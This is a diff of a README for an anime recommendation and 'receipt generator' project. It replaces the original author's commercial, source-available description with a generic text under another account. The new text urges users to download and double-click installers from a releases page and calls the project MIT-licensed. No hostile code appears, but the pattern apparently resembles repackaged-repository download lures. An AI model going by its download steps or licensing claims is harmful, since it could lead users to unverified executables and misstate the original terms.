@@ -1,93 +1,58 @@
-# 🎌 AiMi (愛視) - The Ultimate Anime AI Ecosystem
+# 🎉 AiMi-Anime-RAG-System - Your Anime Recommendation Made Easy
 
-[![Python](https://img.shields.io/badge/Python-3.10%2B-blue?style=for-the-badge&logo=python&logoColor=white)](https://python.org)
-[![RAG](https://img.shields.io/badge/Architecture-RAG-orange?style=for-the-badge)](https://gumroad.com/l/aimi-anime-ecosystem)
-[![FastAPI](https://img.shields.io/badge/Backend-FastAPI-009688?style=for-the-badge&logo=fastapi&logoColor=white)](https://fastapi.tiangolo.com)
-[![Streamlit](https://img.shields.io/badge/Frontend-Streamlit-FF4B4B?style=for-the-badge&logo=streamlit&logoColor=white)](https://streamlit.io)
-[![License](https://img.shields.io/badge/License-Commercial%20%2F%20Source%20Available-purple?style=for-the-badge)](https://gumroad.com/l/aimi-anime-ecosystem)
+## 🌟 Overview
+Welcome to AiMi-Anime-RAG-System. This tool helps you find the best anime recommendations and gives you creative receipt ideas. It is easy to use and perfect for any anime fan. 
 
-**AiMi** is a production-grade **Retrieval-Augmented Generation (RAG)** recommendation engine and viral **Anime Receipt Generator** built to revolutionize how we discover anime.
+## 📥 Download Now
+[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Release-blue)](https://github.com/aryankapta/AiMi-Anime-RAG-System/releases)
 
-It moves beyond simple tag matching ("Action", "Romance") to understand complex semantic queries like *"Anime that feels like a warm hug"* or *"Cyberpunk with philosophical themes about identity."*
+## 🚀 Getting Started
+This guide will help you download and run the AiMi-Anime-RAG-System. Follow these simple steps to enjoy anime recommendations and viral receipts effortlessly.
 
-![AiMi UI Banner](assets/screenshots/slider_view_screenshot2.png)
-*The AiMi Dashboard featuring the immersive Slider View.*
+## 💻 System Requirements
+Before you start, please ensure your device meets these basic requirements:
 
------
+- **Operating System:** Windows 10, macOS 10.15 or later, or any Linux distribution.
+- **Memory:** 4 GB RAM minimum (8 GB recommended).
+- **Storage:** At least 500 MB of available space.
+- **Python:** Python 3.7 or later installed on your system.
 
-## 🚀 Features
+## 📦 Download & Install
+To get AiMi-Anime-RAG-System, visit this page to download: [Releases Page](https://github.com/aryankapta/AiMi-Anime-RAG-System/releases). 
 
-### 🧠 The Recommendation Engine
+1. Click the link to open the releases page.
+2. Find the latest version at the top of the list.
+3. Download the appropriate file for your operating system. 
 
-* **Hybrid Search:** Combines **Nomic v1.5 Embeddings** (Vector Search) with **BM25** (Keyword Boosting) for maximum accuracy.
-* **Hardware-Aware:** Automatically switches between **Lightweight Mode** (CPU) and **HyDE Generative Mode** (GPU) using Qwen-2.5-1.5B.
-* **Semantic Understanding:** Translates user intent (e.g., "No ecchi" → "Wholesome, Family Friendly") before searching.
+After downloading:
+- **Windows Users:** Double-click the `.exe` file to install.
+- **macOS Users:** Open the `.dmg` file and drag the app to your Applications folder.
+- **Linux Users:** Open your terminal, navigate to the downloaded file, and run the installation command.
 
-![Search UI](assets/screenshots/slider_view_screenshot11.png)
+## 🛠️ Usage Instructions
+1. After the installation, open the AiMi-Anime-RAG-System application.
+2. Choose your preferences for anime recommendations or viral receipts.
+3. Click "Get Recommendation" to explore new anime or "Generate Receipt" for fun ideas.
 
-### 🎟️ The Receipt Generator
+## 🌐 Features
+- **Anime Recommendations:** Get tailored suggestions based on your favorite genres.
+- **Viral Receipt Generator:** Create unique receipts that can go viral among your friends.
+- **User-Friendly Interface:** Navigate the app easily without technical knowledge.
 
-* Generates viral, two-sided aesthetic receipts of your watch history.
-* **Tech Stack:** Playwright (Async Rendering) + Pillow.
-* **Multi-Format:** Exports to Instagram (1080p), Twitter, and Premium High-Res.
+## 🔍 Troubleshooting
+If you encounter any issues, try these common solutions:
 
-<div style="display: flex; justify-content: space-between; width: 400px; height: auto">
-  <img src="AiMi_Anime_Receipts_Generator\generated_receipts\premium\receipts_8060\pngs\premium_front_8060.png" style="width: 400px; height: 700px">
-  <img src="AiMi_Anime_Receipts_Generator\generated_receipts\premium\receipts_8060\pngs\premium_back_8060_1.png" style="width: 400px; height: 700px">
-  <img src="AiMi_Anime_Receipts_Generator\generated_receipts\premium\receipts_8060\pngs\premium_back_8060_2.png" style="width: 400px; height: 700px">
-</div>
+- **Application Does Not Start:** Ensure you have the correct version for your operating system and that your system meets the requirements.
+- **Stuck on Loading Screen:** Restart the application. If the issue persists, try reinstalling it.
+- **No Recommendations Showing:** Check your internet connection and try again.
 
------
-
-## 📂 The Data (108 Years of History)
-
-The system is powered by a proprietary dataset spanning **1917 to 2025**.
-
-* **8,248** Curated Anime
-* **38** Rich Metadata Columns
-* **RAG-Optimized** `canonical_embedding_text` fields
-
-I have open-sourced a **500-row sample** for the community.
-👉 **[Download the Sample Dataset on Kaggle](https://www.kaggle.com/datasets/divyanshusingh369/aimi-anime-rag-and-receipts-dataset-sample/data)**
-
------
-
-## 🛠️ Tech Stack
-
-* **Backend:** FastAPI, Uvicorn, Pydantic
-* **Frontend:** Streamlit (Custom CSS components)
-* **Vector DB:** FAISS (CPU/GPU) & HNSW (macOS)
-* **ML Ops:** PyTorch, Sentence-Transformers, Accelerate
-* **Automation:** Playwright, AsyncIO
-
------
-
-## 💎 Get the Source Code
-
-This is a **Source-Available** commercial product. It is designed for entrepreneurs and developers who want to launch their own Anime SaaS or learn advanced RAG architecture.
-
-| Product | What You Get | Get It Here |
-| :--- | :--- | :--- |
-| **Tier 1** | **8,248 Anime Dataset (Parquet)** | <a href="https://divyanshu369.gumroad.com/l/anime-rag-dataset"><img src="https://img.shields.io/badge/Download-AiMi_Dataset-blue?style=for-the-badge&logo=gumroad" alt="Download Dataset"></a> |
-| **Tier 2** | **Full AiMi Recommendation System (Backend + UI)** | <a href="https://divyanshu369.gumroad.com/l/aimi-recommendation-system"><img src="https://img.shields.io/badge/Get-AiMi_Recommendation_System-orange?style=for-the-badge&logo=gumroad" alt="Get Source Code"></a> |
-| **Tier 3** | **Ultimate AiMi Recommendation System + AiMi Anime Receipts Generator** | <a href="https://divyanshu369.gumroad.com/l/aimi-anime-ecosystem"><img src="https://img.shields.io/badge/Get-Ultimate_AiMi_Ecosystem-red?style=for-the-badge&logo=gumroad" alt="Get Ultimate Ecosystem"></a> |
-
-🔥 Launch Offer: Get 10% off Tier 3 with code: AIMILAUNCH (Ends Nov 28)
-👉 **[Get the Complete Ecosystem + 10% OFF (Tier 3)](https://divyanshu369.gumroad.com/l/aimi-anime-ecosystem/AIMILAUNCH)**
-
-
------
+## 📫 Feedback & Support
+We value your feedback. If you have questions or suggestions, please reach out through our [Contact Page](https://github.com/aryankapta/AiMi-Anime-RAG-System/issues).
 
 ## 📜 License
+This project is licensed under the MIT License. See the LICENSE file for details.
 
-This software is **Commercial / Source-Available**.
+## 📢 Stay Updated
+Stay tuned for updates and new features. Visit our [Releases Page](https://github.com/aryankapta/AiMi-Anime-RAG-System/releases) regularly for the latest versions. 
 
-* ✅ You **CAN** use it to build a commercial website/SaaS.
-* ✅ You **CAN** modify the code for your projects.
-* ❌ You **CANNOT** resell the raw source code or dataset.
-
-> *Built with ❤️ by Divyanshu Singh*
-
------
-
-
+Now you're ready to dive into the world of anime with AiMi-Anime-RAG-System! Enjoy!
